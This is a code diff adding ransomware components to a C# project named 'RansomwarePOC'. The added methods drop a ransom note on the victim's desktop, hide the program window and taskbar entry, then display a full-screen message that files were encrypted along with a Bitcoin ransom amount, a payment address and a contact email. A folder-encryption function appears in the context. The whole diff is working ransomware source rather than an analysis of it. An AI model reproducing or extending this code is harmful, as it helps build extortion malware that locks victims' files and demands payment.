@@ -73,6 +73,30 @@ namespace RansomwarePOC
                 Application.Exit();
             }
         }
+         private void dropRansomLetter()
+        {
+            StreamWriter ransomWriter = new StreamWriter(DESKTOP_FOLDER + @"\___RECOVER__FILES__" + ENCRYPTED_FILE_EXTENSION + ".txt");
+            //@ perdoret per me e mar stringun mas @ si literal
+            ransomWriter.WriteLine(RANSOM_LETTER);
+            ransomWriter.WriteLine(ENCRYPTION_LOG);
+            ransomWriter.Close();
+        }
+
+        private void formatFormPostEncryption()
+        {
+            this.Opacity = 100;
+            this.WindowState = FormWindowState.Maximized;
+            lblCount.Text = "Your files (count: " + encryptedFileCount + ") have been encrypted!";
+        }
+        private void initializeForm()
+        {
+            this.Opacity = 0;
+            this.ShowInTaskbar = false;
+            lblBitcoinAmount.Text = "Please send " + BITCOIN_RANSOM_AMOUNT + " Bitcoin(s) to the following BTC address:";
+            txtBitcoinAddress.Text = BITCOIN_ADDRESS;
+            txtEmailAddress.Text = EMAIL_ADDRESS;
+            lblBitcoinAmount.Focus();
+        }
         static void encryptFolderContents(string sDir)
         {
             try
